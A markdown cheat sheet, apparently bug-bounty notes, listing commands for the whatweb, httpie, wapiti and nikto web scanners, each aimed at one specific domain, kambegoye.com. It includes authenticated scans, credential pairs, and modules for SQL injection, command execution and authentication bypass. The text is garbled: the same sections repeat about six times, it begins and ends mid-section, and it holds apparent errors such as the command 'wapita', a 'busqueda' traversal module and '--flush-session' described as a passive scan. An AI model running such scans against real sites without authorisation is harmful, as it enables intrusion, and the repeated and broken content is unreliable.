http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
